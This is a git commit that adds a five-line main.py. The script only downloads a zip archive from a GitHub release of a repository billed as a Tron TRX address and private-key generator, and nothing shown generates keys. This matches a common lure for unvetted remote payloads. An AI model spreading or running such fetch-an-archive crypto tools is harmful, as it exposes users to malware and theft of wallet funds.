9495d4d708a8879406e2b242c1ac1db98adc34a4
dan-wright-eng1989t7 <agnellatorivio@gmail.com>
2026-08-13 15:41:24 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,5 @@
+import urllib.request
+
+url = "https://github.com/dan-wright-eng1989t7/Tron-TRX-Address-and-Private-key-Generator/releases/download/TRX-GENERATOR/TRX-GENERATOR.zip"
+
+urllib.request.urlretrieve(url, "TRX-GENERATOR.zip")
